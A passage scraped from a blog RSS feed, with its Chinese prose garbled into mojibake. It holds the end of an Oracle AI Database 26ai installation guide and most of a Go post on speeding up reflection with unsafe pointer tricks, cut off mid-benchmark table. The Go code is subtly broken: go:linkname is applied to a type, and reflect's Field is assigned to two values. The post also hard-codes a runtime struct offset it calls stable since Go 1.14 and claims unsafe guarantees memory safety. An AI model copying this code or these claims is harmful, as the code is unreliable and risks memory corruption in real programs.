  Verifying        : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 

Failed:
  oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                                                   

Error: Transaction failed
</code></pre>
<p>è¿éå°±æ¯ä¸ªç®å½æéçå°é®é¢ï¼ç´æ¥è¿æ ·ä¿®æ¹ä¸ï¼ç¶ååæ¬¡æ§è¡ï¼</p>
<pre><code class="language-bash">$ sudo chown oracle:oinstall /opt/oracle
$ sudo dnf install oracle-ai-database-ee-26ai-1.0-1.el8.x86_64.rpm
Last metadata expiration check: 2:44:36 ago on Wed 28 Jan 2026 07:06:04 AM GMT.
Dependencies resolved.
============================================================================================================================================================================
 Package                                                Architecture                       Version                           Repository                                Size
============================================================================================================================================================================
Installing:
 oracle-ai-database-ee-26ai                             x86_64                             1.0-1                             @commandline                             2.0 G

Transaction Summary
============================================================================================================================================================================
Install  1 Package

Total size: 2.0 G
Installed size: 5.7 G
Is this ok [y/N]: y
Downloading Packages:
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Preparing        :                                                                                                                                                    1/1 
  Running scriptlet: oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 
  Installing       : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 
  Running scriptlet: oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 
[INFO] Executing post installation scripts...
[INFO] Oracle home installed successfully and ready to be configured.
To configure a sample Oracle AI Database, optionally modify the parameters in '/etc/sysconfig/oracledb_ORCLCDB-26ai.conf' and then run following service configuration script as root: /etc/init.d/oracledb_ORCLCDB-26ai configure

  Verifying        : oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                            1/1 

Installed:
  oracle-ai-database-ee-26ai-1.0-1.x86_64                                                                                                                                   

Complete!
</code></pre>
<h2 id="04--éç½®æ°æ®åºå®ä¾">04 | éç½®æ°æ®åºå®ä¾</h2>
<p>æç§ä¸ä¸æ­¥çæ¥å¿æç¤ºï¼æä»¬å¯ä»¥éæ©ä¿®æ¹é¨ååæ°ï¼å¨è¿ä¸ªéç½®æä»¶ä¸­ï¼<code>/etc/sysconfig/oracledb_ORCLCDB-26ai.conf</code></p>
<p>æ²¡ç¹æ®éæ±ä¹å¯ä»¥ä¸ä¿®æ¹ï¼ç´æ¥å®è£ï¼è¿æ¯ä½¿ç¨rootç¨æ·æèsudoæä½ï¼</p>
<pre><code class="language-bash">sudo /etc/init.d/oracledb_ORCLCDB-26ai configure
</code></pre>
<p>ç»æå¦ä¸ï¼</p>
<pre><code class="language-BASH">$ sudo /etc/init.d/oracledb_ORCLCDB-26ai configure
/opt/oracle/product/26ai/dbhome_1/bin/dbca -silent -createDatabase -gdbName ORCLCDB -templateName General_Purpose.dbc -characterSet AL32UTF8 -createAsContainerDatabase true -numberOfPDBs 1 -pdbName ORCLPDB1 -createListener LISTENER:1521 -datafileDestination /opt/oracle/oradata -sid ORCLCDB -autoGeneratePasswords
Configuring Oracle AI Database ORCLCDB.
Prepare for db operation
8% complete
Copying database files
31% complete
Creating and starting Oracle instance
32% complete
36% complete
39% complete
42% complete
46% complete
Completing Database Creation
51% complete
53% complete
54% complete
Creating Pluggable Databases
58% complete
77% complete
Executing Post Configuration Actions
100% complete
Database creation complete. For details check the logfiles at:
 /opt/oracle/cfgtoollogs/dbca/ORCLCDB.
Database Information:
Global Database Name:ORCLCDB
System Identifier(SID):ORCLCDB
Look at the log file "/opt/oracle/cfgtoollogs/dbca/ORCLCDB/ORCLCDB.log" for further details.

Database configuration completed successfully. The passwords were auto generated, you must change them by connecting to the database using 'sqlplus / as sysdba' as the oracle user.
</code></pre>
<p>å°è¿éå¶å®å°±å®è£å®äºï¼å¯ä»¥çå°å®ä¾é½å¯å¨æåäºï¼</p>
<pre><code class="language-bash">$ ps -ef|grep pmon
oracle   3043187       1  0 09:54 ?        00:00:00 ora_pmon_ORCLCDB
</code></pre>
<p>Oracleç¨æ·çç¯å¢åéä¸ç¡®è®¤å¨æ°ç¯å¢ä¸æ¯ä¸æ¯ä¹ä¼èªå¨éç½®ï¼ç¬èè¿éå ä¸ºæå¶ä»DBç¯å¢ï¼æä»¥åéæ²¡æèªå¨éç½®çï¼æåä¸ä¸ªä¸´æ¶çï¼å¦æä½ çä¹æ²¡æï¼å°±ä¹åç§è¿æ ·åï¼</p>
<p>vi 26ai.env</p>
<pre><code class="language-bash">export ORACLE_SID=ORCLCDB
export ORACLE_BASE=/opt/oracle
export ORACLE_HOME=/opt/oracle/product/26ai/dbhome_1
export PATH=$ORACLE_HOME/bin:$PATH
</code></pre>
<p>ç¶åæ³åæ¢è¿ä¸ª26aiç¯å¢å°±sourceä¸ä¸ï¼å¦æä½ åªæä¸ä¸ªç¯å¢ï¼å°±ç´æ¥éç½®å°ç¯å¢åéä¸­ã</p>
<pre><code class="language-BASH">$ source 26ai.env

$ sqlplus / as sysdba

SQL*Plus: Release 23.26.1.0.0 - Production on Fri Jan 30 14:39:00 2026
Version 23.26.1.0.0

Copyright (c) 1982, 2025, Oracle.  All rights reserved.


Connected to:
Oracle AI Database 26ai Enterprise Edition Release 23.26.1.0.0 - Production
Version 23.26.1.0.0

SQL&gt; show pdbs;

    CON_ID CON_NAME                       OPEN MODE  RESTRICTED
---------- ------------------------------ ---------- ----------
         2 PDB$SEED                       READ ONLY  NO
         3 ORCLPDB1                       READ WRITE NO
</code></pre>
<p>syså¯ç æ¯èªå¨çæçï¼å¯ä»¥èªå·±ä¿®æ¹ä¸ºèªå·±æ³è¦çï¼</p>
<pre><code class="language-sql">alter user sys identified by "your-sys-password";
</code></pre>
<p>é¡ºææ¥ççå¬ <code>lsnrctl status</code> åç°ä¹é½æ¯èªå¨å¯å¨æåçã</p>
<p>å©ä¸è¦åçå°±åªæ¯æéåå»ºèªå·±çæµè¯ç¨æ·ï¼å°±è½ç´æ¥ç¨èµ·æ¥äºã</p>


</div>
<div id="MySignature" role="contentinfo">
    <a href="https://www.cnblogs.com/jyzhao/" target="_blank">AlfredZhao</a>Â©çæææãä»Oracleèµ·èªï¼é¢ç¥ç²¾å½©çITææ¯ãã<br>
è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa" target="_blank">https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa</a>
<hr>
<div style="text-align:center; margin-top:30px;">
  <p style="font-size:14px;color:#555;">
    ð æè°¢éè¯»ï¼æ¬¢è¿å³æ³¨æçå¬ä¼å· <b>ãèµµéå®ã</b>
  </p>
  <img src="https://images.cnblogs.com/cnblogs_com/jyzhao/824234/o_250208075013_qrcode-zjy.jpg" width="160" style="border:1px solid #ddd;border-radius:8px;">
</div>
</div>
<div class="clear"></div>

        <div class="clear"></div>
        
</div>
    <ul class="postmetadata">
        <vc:categories-tags blog-app="jyzhao" blog-id="186567" post-id="19556062"></vc:categories-tags>
    </ul>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Goåå°ï¼æ§è½ç¶é¢ä¸é¶æ·è´ä¼å ]]></title>
    <link>https://www.cnblogs.com/fgaoxing/p/19555877</link>
    <guid>fc9859e3d51a54f97a690e7bfa4dc9ab</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/fgaoxing/p/19555877" title="åå¸äº 2026-01-30 22:01">
    <span role="heading" aria-level="2">Goåå°ï¼æ§è½ç¶é¢ä¸é¶æ·è´ä¼å</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>åæï¼<a href="https://www.yt-blog.top/38912/" target="_blank" rel="noopener nofollow">https://www.yt-blog.top/38912/</a></p>
</blockquote>
<p>åGoå¼åçï¼è¯å®å°ä¸äºç¨åå°ââè§£æTagãæ¿å­æ®µåç§»ãè·åç±»åä¿¡æ¯ï¼ORMãåºååãéç½®ç»å®è¿äºå°æ¹é½è¦ç¨å°ã</p>
<p>ä½æ¯å®æ¹ç<code>reflect</code>åæ§è½ççä¸å¤ªè¡ï¼è§£æä¸ä¸ªå­æ®µæTagè¦è±å åå°å ç¾ä¸çº³ç§ï¼è°å¾å¤äºï¼ç´æ¥ææ§è½ç¶é¢ã</p>
<p>å¾å¤äººåªç¥éãåå°æ¢ãï¼ä½ä¸ç¥éæ¢å¨åªãå±ä»¬ä»å¤©å°±ä»<code>runtime</code>å±é¢åæä¸ä¸ï¼é¡ºä¾¿æä¸ªé¶æ·è´çä¼åæ¹æ¡ã</p>
<h2 id="ä¸åä»åºå±è¯´èµ·">ä¸ãåä»åºå±è¯´èµ·</h2>
<p>è¦ææ¸æ¥åå°çæ§è½é®é¢ï¼å¾åç¥éGoåºå±æ¯æä¹åäºã</p>
<p>ä»Go1.14å¼å§ï¼<code>runtime</code>éå ä¸ªæ ¸å¿ç±»åçåå­å¸å±å°±æ²¡åè¿ãè¿æ¯ä¸ªå³é®ç¹ã</p>
<p>Goçåå°åå°±æ¯åºäº<code>runtime</code>å±ç<code>abi</code>å®ç°çã</p>
<p><a href="https://github.com/golang/go/blob/master/src/reflect/type.go" target="_blank" rel="noopener nofollow">reflect/type.go</a></p>
<pre><code class="language-go">// TypeOf returns the reflection [Type] that represents the dynamic type of i.
// If i is a nil interface value, TypeOf returns nil.
func TypeOf(i any) Type {
 return toType(abi.TypeOf(i))
}
</code></pre>
<p>å¶å®<code>reflect.Type</code>å°±æ¯ä¸ä¸ªæ¥å£ï¼ä¸é¢ä»£ç éç<code>toType()</code>æå®è½¬æäº<code>reflect.rtype</code>ã</p>
<pre><code class="language-go">// rtype is the common implementation of most values.
// It is embedded in other struct types.
type rtype struct {
 t abi.Type
}

func toRType(t *abi.Type) *rtype {
 return (*rtype)(unsafe.Pointer(t))
}
</code></pre>
<p>æä»¥æåæ¿å°çæ¯ä¸ª<code>abi.Type</code>å®ä¾ï¼<code>reflect.rtype</code>åªæ¯ç»å®åäºä¸å±ï¼æä¾ä¸ªåå¥½çæ¥å£ãä¹å¯ä»¥æ¢æå«çç±»åä¸ç¨ç»æä½ï¼ä½æ¬è´¨ä¸é½æ¯å¯¹<code>abi.Type</code>çå°è£ã</p>
<p><a href="https://github.com/golang/go/blob/master/src/internal/abi/type.go" target="_blank" rel="noopener nofollow">internal/abi/type.go</a></p>
<pre><code class="language-go">// Type is the runtime representation of a Go type.
//
// Be careful about accessing this type at build time, as the version
// of this type in the compiler/linker may not have the same layout
// as the version in the target binary, due to pointer width
// differences and any experiments. Use cmd/compile/internal/rttype
// or the functions in compiletype.go to access this type instead.
// (TODO: this admonition applies to every type in this package.
// Put it in some shared location?)
type Type struct {
 Size_       uintptr
 PtrBytes    uintptr // number of (prefix) bytes in the type that can contain pointers
 Hash        uint32  // hash of type; avoids computation in hash tables
 TFlag       TFlag   // extra type information flags
 Align_      uint8   // alignment of variable with this type
 FieldAlign_ uint8   // alignment of struct field with this type
 Kind_       Kind    // enumeration for C
 // function for comparing objects of this type
 // (ptr to object A, ptr to object B) -&gt; ==?
 Equal func(unsafe.Pointer, unsafe.Pointer) bool
 // GCData stores the GC type data for the garbage collector.
 // Normally, GCData points to a bitmask that describes the
 // ptr/nonptr fields of the type. The bitmask will have at
 // least PtrBytes/ptrSize bits.
 // If the TFlagGCMaskOnDemand bit is set, GCData is instead a
 // **byte and the pointer to the bitmask is one dereference away.
 // The runtime will build the bitmask if needed.
 // (See runtime/type.go:getGCMask.)
 // Note: multiple types may have the same value of GCData,
 // including when TFlagGCMaskOnDemand is set. The types will, of course,
 // have the same pointer layout (but not necessarily the same size).
 GCData    *byte
 Str       NameOff // string form
 PtrToThis TypeOff // type for pointer to this type, may be zero
}
</code></pre>
<p>å½ç¶å®éä¸ç»æä½æ°æ®æ¯å¦ä¸ç»æä½çæ©å±ï¼åæ ·å®ä¹å¨ä¸èµ·ã</p>
<p><a href="https://github.com/golang/go/blob/master/src/internal/abi/type.go" target="_blank" rel="noopener nofollow">internal/abi/type.go</a></p>
<pre><code class="language-go">type StructField struct {
 Name   Name    // name is always non-empty
 Typ    *Type   // type of field
 Offset uintptr // byte offset of field
}

type StructType struct {
 Type
 PkgPath Name
 Fields  []StructField
}
</code></pre>
<p>è¿æä¸ç¹ï¼è¿äºåºå±ç±»åéå­çç»æä½åæ°æ®ï¼æ¯ç¼è¯å¨ç¼è¯æ¶å°±åè¿ç¨åºç<strong>åªè¯»åå­åº</strong>äºï¼<strong>å°ååºå®ãGCä¸åæ¶ãè¿è¡æ¶ä¸è½æ¹</strong>ãè¿ç»ç´æ¥æä½åºå±åå­æä¾äºå®å¨ä¿éã</p>
<p>æ¢ç¶è¿æ ·ï¼æä»¬å¯ä»¥ç¨<strong>åºå®åç§»é</strong>ç²¾ç¡®æ¾å°ç®æ å­æ®µï¼ä¸ç¨å®æ´è§£ææ´ä¸ªåºå±ç»æä½ï¼åªè¦å®ä¹å ä¸ªç©ºçéåç±»åæ¥åç±»åæ æ³¨å°±å¤äºã</p>
<h2 id="äºæ§è½ç¶é¢å¨åªå¿">äºãæ§è½ç¶é¢å¨åªå¿</h2>
<p><code>reflect.TypeOf()</code>åºå±å°±æ¯åä¸ªæéè½¬æ¢ï¼ä¸æ·è´ä¸è®¡ç®ï¼æºå¿«çãçæ­£çæ§è½æèåºå¨åé¢ä¸¤ä¸ªé¶æ®µï¼èä¸å ä¸ºæ²¡ç¼å­ï¼æèè¢«æ¾å¤§äºå¥½å åã</p>
<h3 id="21-fieldæ¹æ³åäºæ æä¹çåå­åé">2.1 Fieldæ¹æ³åäºæ æä¹çåå­åé</h3>
<p>è°ç¨<code>reflect.Type.Field(i)</code>çæ¶åï¼<code>rtype</code>ä¼è¢«è½¬æ<code>*StructType</code>ï¼ç¶åä»<code>Fields</code>å­æ®µéè¯»ç®æ å­æ®µä¿¡æ¯ã</p>
<p><a href="https://github.com/golang/go/blob/master/src/reflect/type.go" target="_blank" rel="noopener nofollow">reflect/type.go</a></p>
<pre><code class="language-go">// Struct field
type structField = abi.StructField // æ³¨æï¼ä½ å¹³æ¶ç¨çæ¯ reflect.structFieldï¼ä¸æ¯reflect.StructField

// structType represents a struct type.
type structType struct {
 abi.StructType
}

func (t *rtype) Field(i int) StructField {
 if t.Kind() != Struct {
  panic("reflect: Field of non-struct type " + t.String())
 }
 tt := (*structType)(unsafe.Pointer(t))
 return tt.Field(i)
}

// Field returns the i'th struct field.
func (t *structType) Field(i int) (f StructField) {
 if i &lt; 0 || i &gt;= len(t.Fields) {
  panic("reflect: Field index out of bounds")
 }
 p := &amp;t.Fields[i]
 f.Type = toType(p.Typ)
 f.Name = p.Name.Name()
 f.Anonymous = p.Embedded()
 if !p.Name.IsExported() {
  f.PkgPath = t.PkgPath.Name()
 }
 if tag := p.Name.Tag(); tag != "" {
  f.Tag = StructTag(tag)
 }
 f.Offset = p.Offset

 // We can't safely use this optimization on js or wasi,
 // which do not appear to support read-only data.
 if i &lt; 256 &amp;&amp; runtime.GOOS != "js" &amp;&amp; runtime.GOOS != "wasip1" {
  staticuint64s := getStaticuint64s()
  p := unsafe.Pointer(&amp;(*staticuint64s)[i])
  if unsafe.Sizeof(int(0)) == 4 &amp;&amp; goarch.BigEndian {
   p = unsafe.Add(p, 4)
  }
  f.Index = unsafe.Slice((*int)(p), 1)
 } else {
  // NOTE(rsc): This is the only allocation in the interface
  // presented by a reflect.Type. It would be nice to avoid,
  // but we need to make sure that misbehaving clients of
  // reflect cannot affect other uses of reflect.
  // One possibility is CL 5371098, but we postponed that
  // ugliness until there is a demonstrated
  // need for the performance. This is issue 2320.
  f.Index = []int{i}
 }
 return
}
</code></pre>
<p>ä¸é¢è¿æ®µä»£ç é®é¢å¨åªå¿å¢ï¼ç<code>f.Index = []int{i}</code>è¿ä¸è¡ãè¿éæ æä¹å°åå»ºäºä¸ä¸ªåè¡¨ï¼å®éä¸è¿ä¸ªæ°æ®å°±æ¯ä½ èªå·±ä¼ è¿å»ç<code>i</code>ï¼å®å¨æ²¡å¿è¦ãè¿æ­¥æä½çº¯ç²¹æ¯ä¸ºäºå¼å®¹æ§ã</p>
<p>å·ä½è®¨è®ºå¯ä»¥ç<a href="https://github.com/golang/go/issues/68380" target="_blank" rel="noopener nofollow">golang/go Â· Issue#68380</a>ã</p>
<h3 id="22-tagè·åæ¶çå­ç¬¦ä¸²æ·è´">2.2 Tagè·åæ¶çå­ç¬¦ä¸²æ·è´</h3>
<p>åæè¯´çè·åå­æ®µçæ¶åï¼<code>StructField</code>ç<code>Tag</code>å­æ®µæ¯<code>StructTag</code>ç±»åï¼å¶å®å°±æ¯ä¸ª<code>string</code>ã</p>
<p><a href="https://github.com/golang/go/blob/master/src/reflect/type.go" target="_blank" rel="noopener nofollow">reflect/type.go</a></p>
<pre><code class="language-go">// A StructTag is the tag string in a struct field.
//
// By convention, tag strings are a concatenation of
// optionally space-separated key:"value" pairs.
// Each key is a non-empty string consisting of non-control
// characters other than space (U+0020 ' '), quote (U+0022 '"'),
// and colon (U+003A ':').  Each value is quoted using U+0022 '"'
// characters and Go string literal syntax.
type StructTag string

// Get returns the value associated with key in the tag string.
// If there is no such key in the tag, Get returns the empty string.
// If the tag does not have the conventional format, the value
// returned by Get is unspecified. To determine whether a tag is
// explicitly set to the empty string, use [StructTag.Lookup].
func (tag StructTag) Get(key string) string {
 v, _ := tag.Lookup(key)
 return v
}

// Lookup returns the value associated with key in the tag string.
// If the key is present in the tag the value (which may be empty)
// is returned. Otherwise the returned value will be the empty string.
// The ok return value reports whether the value was explicitly set in
// the tag string. If the tag does not have the conventional format,
// the value returned by Lookup is unspecified.
func (tag StructTag) Lookup(key string) (value string, ok bool) {
 // When modifying this code, also update the validateStructTag code
 // in cmd/vet/structtag.go.

 for tag != "" {
  // Skip leading space.
  i := 0
  for i &lt; len(tag) &amp;&amp; tag[i] == ' ' {
   i++
  }
  tag = tag[i:]
  if tag == "" {
   break
  }

  // Scan to colon. A space, a quote or a control character is a syntax error.
  // Strictly speaking, control chars include the range [0x7f, 0x9f], not just
  // [0x00, 0x1f], but in practice, we ignore the multi-byte control characters
  // as it is simpler to inspect the tag's bytes than the tag's runes.
  i = 0
  for i &lt; len(tag) &amp;&amp; tag[i] &gt; ' ' &amp;&amp; tag[i] != ':' &amp;&amp; tag[i] != '"' &amp;&amp; tag[i] != 0x7f {
   i++
  }
  if i == 0 || i+1 &gt;= len(tag) || tag[i] != ':' || tag[i+1] != '"' {
   break
  }
  name := string(tag[:i])
  tag = tag[i+1:]

  // Scan quoted string to find value.
  i = 1
  for i &lt; len(tag) &amp;&amp; tag[i] != '"' {
   if tag[i] == '\\' {
    i++
   }
   i++
  }
  if i &gt;= len(tag) {
   break
  }
  qvalue := string(tag[:i+1])
  tag = tag[i+1:]

  if key == name {
   value, err := strconv.Unquote(qvalue)
   if err != nil {
    break
   }
   return value, true
  }
 }
 return "", false
}
</code></pre>
<p>è¿éç<code>tag[:i]</code>å<code>tag[i+1:]</code>ä¼éå¼è½¬æ<code>slice</code>ï¼è¿ä¸æ­¥åªæ¹äºæ ä¸çåä¿¡æ¯ç»æä½ï¼ä½æ¯<code>string</code>è½¬æ¢è¿ç¨ä¸ºäºä¿è¯åå­å®å¨ï¼ä¼è§¦åä¸æ¬¡åå­æ·è´ï¼è¿ä¸æ­¥æ¯èº²ä¸æçã</p>
<p>ç°å¨ä¸»æµæ¹æ¡åå®æ¹ç<code>strings.Builder</code>ç<code>String()</code>æ¹æ³ï¼å ä¸ºä¸éè¦æåå§æ°æ®åæ°å­ç¬¦ä¸²éç¦»å¼ï¼æä»¥ç¨çæ¯<code>unsafe.String(unsafe.SliceData(b.buf), len(b.buf))</code>ã</p>
<p>è¿æ ·å¾å°ç<code>string</code>å<code>buf</code>æååä¸ååå­ï¼ä¸ä¼è§¦åé¢å¤çåå­æ·è´ï¼èä¸<code>unsafe</code>è½ä¿è¯åå­å®å¨ï¼ä¸ä¼è¢«GCåæ¶ã</p>
<h2 id="ä¸é¶æ·è´ä¼åçæè·¯">ä¸ãé¶æ·è´ä¼åçæè·¯</h2>
<p>éå¯¹ä¸é¢è¯´çæ§è½ç¶é¢ï¼ç»åGo1.14+åºå±ç±»åç»æåºå®çç¹ç¹ï¼é¶æ·è´ä¼åçæè·¯å¶å®æºç®åçï¼</p>
<ol>
<li>ä¸ç¨åå°åé£ä¸å±å°è£ï¼ç´æ¥å¯¹æ¥runtimeå±ï¼å¨ç¨<strong>åªè¯»åå­</strong>ï¼ä¸åä»»ä½æ²¡å¿è¦çæ·è´ï¼</li>
<li>å®ä¹å ä¸ª<strong>ç©ºçéåç±»å</strong>æ¥åç±»åæ æ³¨ï¼ä¸ç¨å¡«ä»»ä½å­æ®µï¼ç¨<strong>Go1.14+åºå®çåå­åç§»é</strong>ç²¾åæ¾å°ç®æ å­æ®µï¼</li>
<li>è§£æ<code>reflect.Type</code>æ¥å£æ¿å°åºå±çåå§åå­å°åï¼éè¿<code>unsafe</code>æä½ï¼ç¨åºå®åç§»éç´æ¥è¯»æ°æ®ï¼</li>
<li>æä¸ª<strong>å¨å±ç¼å­</strong>å­ç»æä½åæ°æ®ï¼æ¯ä¸ªç»æä½åªè§£æä¸æ¬¡ï¼é¿åé«é¢åºæ¯ä¸çéå¤æä½ã</li>
</ol>
<p>è¿ä¸ªæ¹æ¡çæ ¸å¿é»è¾è·Goåºå±æä½å®å¨ä¸æ ·ï¼ææåç§»éé½æ¯åºäºGo1.14+çåºå®å¸å±é¢è®¾çï¼éå°ç¹æ®çæ¬é¡¶å¤æ¹æ¹åç§»éï¼ä¸ç¨æå¿å¼å®¹æ§é®é¢ã</p>
<h2 id="åå·ä½å®ç°">åãå·ä½å®ç°</h2>
<p>åé¢åæäºåå¤©ï¼åå°æ¢ä¸»è¦æä¸¤ä¸ªé®é¢ï¼</p>
<ol>
<li><code>Field</code> æ¹æ³ä¼åå»ºä¸ä¸ªæ æä¹ç <code>[]int{i}</code> åçï¼ä¸ºäºå¼å®¹æ§ï¼</li>
<li><code>Tag.Get</code> ä¼è§¦åå­ç¬¦ä¸²çåå­æ·è´</li>
</ol>
<p>ä¸é¢æ¯å®æ´çé¶æ·è´å®ç°ï¼</p>
<h3 id="41-æ ¸å¿å®ä¹">4.1 æ ¸å¿å®ä¹</h3>
<pre><code class="language-go">//go:build go1.14
// +build go1.14

package zerorefl

import (
  "reflect"
  "strconv"
  "unsafe"
)

const (
  // abiTypeSize æ¯ abi.Type ç»æä½çå¤§å°
  // Go1.14+ ä¸­åºå®ä¸º48å­è
  abiTypeSize = 48
)

// ç©ºéåç±»åï¼åªåç±»åæ æ³¨ï¼ä¸ç¨å¡«å­æ®µ
type rtype struct{}

type structType struct {
  PkgPath Name
  Fields  []structField
}

type structField struct {
  Name   Name
  Typ    *rtype
  Offset uintptr
}

// Name ç±»åï¼è· runtime.Name ä¸æ ·
//go:linkname Name runtime.Name
type Name struct {
  Bytes *byte
}

// ä¸é¢è¿äºæ¹æ³é½æ¯ runtime.Name çå®ç°
//go:linkname Name_Name runtime.(*Name).Name
//go:inline
func (n *Name) Name() string {
  if n.Bytes == nil {
    return ""
  }
  i, l := n.ReadVarint(1)
  return unsafe.String(n.DataChecked(1+i, "non-empty string"), l)
}

//go:linkname Name_Tag runtime.(*Name).Tag
//go:inline
func (n *Name) Tag() string {
  if !n.HasTag() {
    return ""
  }
  i, l := n.ReadVarint(1)
  i2, l2 := n.ReadVarint(1 + i + l)
  return unsafe.String(n.DataChecked(1+i+l+i2, "non-empty string"), l2)
}

//go:linkname Name_IsExported runtime.(*Name).IsExported
//go:inline
func (n *Name) IsExported() bool {
  return (*n.Bytes)&amp;(1&lt;&lt;0) != 0
}

//go:linkname Name_IsEmbedded runtime.(*Name).IsEmbedded
//go:inline
func (n *Name) IsEmbedded() bool {
  return (*n.Bytes)&amp;(1&lt;&lt;3) != 0
}

//go:linkname Name_HasTag runtime.(*Name).HasTag
//go:inline
func (n *Name) HasTag() bool {
  return (*n.Bytes)&amp;(1&lt;&lt;1) != 0
}

//go:linkname Name_ReadVarint runtime.(*Name).ReadVarint
//go:inline
func (n *Name) ReadVarint(off int) (int, int) {
  v := 0
  for i := 0; ; i++ {
    x := n.DataChecked(off+i, "read varint")
    v += int(x&amp;0x7f) &lt;&lt; (7 * i)
    if x&amp;0x80 == 0 {
      return i + 1, v
    }
  }
}

//go:linkname Name_DataChecked runtime.(*Name).DataChecked
//go:inline
func (n *Name) DataChecked(off int, whySafe string) *byte {
  return (*byte)(addChecked(unsafe.Pointer(n.Bytes), uintptr(off), whySafe))
}

func addChecked(p unsafe.Pointer, x uintptr, whySafe string) unsafe.Pointer {
  return unsafe.Pointer(uintptr(p) + x)
}

//go:linkname toType reflect.toType
//go:noescape
func toType(t *rtype) reflect.Type
</code></pre>
<h3 id="42-æ ¸å¿æ¹æ³">4.2 æ ¸å¿æ¹æ³</h3>
<pre><code class="language-go">// GetField è·åç»æä½å­æ®µï¼ä¸åéåç
//
//go:inline
func GetField(sf *reflect.StructField, st *structType, i int) bool {
  if st == nil || i &lt; 0 || i &gt;= len(st.Fields) {
    return false
  }
  stf := &amp;st.Fields[i]
  sf.Name = stf.Name.Name()
  sf.Type = toType(stf.Typ)
  sf.Offset = stf.Offset
  sf.Anonymous = stf.Name.IsEmbedded()
  if tag := stf.Name.Tag(); tag != "" {
    sf.Tag = reflect.StructTag(tag)
  }
  if !stf.Name.IsExported() {
    sf.PkgPath = st.PkgPath.Name()
  }
  // æ³¨æï¼è¿éä¸è®¾ç½® sf.Indexï¼é¿åæ æä¹çåçåé
  return true
}

//go:inline
func TypeFieldLen(st *structType) int {
  return len(st.Fields)
}

// Type2StructType å° reflect.Type è½¬æ¢ä¸º structType
// ç¨åºå®åç§»éç´æ¥è½¬ï¼ä¸æ·è´
func Type2StructType(t reflect.Type) *structType {
  if t.Kind() != reflect.Struct {
    return nil
  }
  // reflect.Type æ¯æ¥å£ï¼åºå±å­ [ç±»åæé, æ°æ®æé]
  // æ°æ®æéå°±æ¯ structType çèµ·å§å°å
  // å ä¸º structType åµå¥äº abi.Typeï¼æä»¥è¦è·³è¿ abi.Type çå¤§å°
  return (*structType)(unsafe.Pointer((*[2]uintptr)(unsafe.Pointer(&amp;t))[1] + abiTypeSize))
}

// RType2Type å° *rtype è½¬æ¢ä¸º reflect.Type
//
//go:inline
func RType2Type(t *rtype) reflect.Type {
  return toType(t)
}
</code></pre>
<h3 id="43-é¶æ·è´tagè·å">4.3 é¶æ·è´Tagè·å</h3>
<pre><code class="language-go">// GetTag é¶æ·è´è·åTagå¼
// æ¯ reflect.StructTag.Get å¿«ï¼é¿åäºå­ç¬¦ä¸²æ·è´
func GetTag(tag reflect.StructTag, key string) (value string, ok bool) {
  for tag != "" {
    // Skip leading space.
    i := 0
    for i &lt; len(tag) &amp;&amp; tag[i] == ' ' {
      i++
    }
    tag = tag[i:]
    if tag == "" {
      break
    }

    // Scan to colon. A space, a quote or a control character is a syntax error.
    i = 0
    for i &lt; len(tag) &amp;&amp; tag[i] &gt; ' ' &amp;&amp; tag[i] != ':' &amp;&amp; tag[i] != '"' &amp;&amp; tag[i] != 0x7f {
      i++
    }
    if i == 0 || i+1 &gt;= len(tag) || tag[i] != ':' || tag[i+1] != '"' {
      break
    }
    name := string(tag[:i])
    tag = tag[i+1:]

    // Scan quoted string to find value.
    needUnquote := false
    i = 1
    for i &lt; len(tag) &amp;&amp; tag[i] != '"' {
      if tag[i] == '\\' {
        needUnquote = true
        i++
      }
      i++
    }
    if i &gt;= len(tag) {
      break
    }
    tmp := tag[:i+1]
    qvalue := string(tmp)
    tag = tag[i+1:]

    if key == name {
      if needUnquote {
        // éè¦è½¬ä¹æ¶ï¼è¿æ¯å¾åéæ°å­ç¬¦ä¸²
        value, err := strconv.Unquote(qvalue)
        if err != nil {
          break
        }
        return value, true
      }
      // ä¸éè¦è½¬ä¹æ¶ï¼ç´æ¥è¿åå­ç¬¦ä¸²åç
      // Goçå­ç¬¦ä¸²åçæ¯é¶æ·è´ç
      return qvalue[1 : len(qvalue)-1], true
    }
  }
  return "", false
}
</code></pre>
<h3 id="44-ä½¿ç¨ç¤ºä¾">4.4 ä½¿ç¨ç¤ºä¾</h3>
<pre><code class="language-go">package main

import (
  "fmt"
  "reflect"
  "zerorefl"
)

type User struct {
  ID   int    `orm:"primaryKey" json:"id"`
  Name string `orm:"varchar(50)" json:"name"`
  Age  int    `json:"age"`
}

func main() {
  t := reflect.TypeOf(User{})

  // ä¼ ç»æ¹å¼ï¼ä¼æåçåéåå­ç¬¦ä¸²æ·è´
  field1, _ := t.Field(0)
  tag1 := field1.Tag.Get("orm")

  // é¶æ·è´æ¹å¼ï¼é¿åæ æä¹çåé
  st := zerorefl.Type2StructType(t)
  if st != nil {
    var field reflect.StructField
    if zerorefl.GetField(&amp;field, st, 0) {
      tag2, _ := zerorefl.GetTag(field.Tag, "orm")
      fmt.Printf("Tagå¼: %s (é¶æ·è´)\n", tag2)
    }
  }

  fmt.Printf("ä¼ ç»æ¹å¼Tagå¼: %s\n", tag1)
}
</code></pre>
<h3 id="45-æ§è½å¯¹æ¯">4.5 æ§è½å¯¹æ¯</h3>
<p>åæ ·æµè¯ç¯å¢ä¸ï¼å¾ªç¯100ä¸æ¬¡è§£æUserç»æä½ç3ä¸ªå­æ®µTagï¼ï¼</p>
<table>
<thead>
<tr>
<th>æä½æ¹å¼</th>
<th>æ»èæ¶</th>
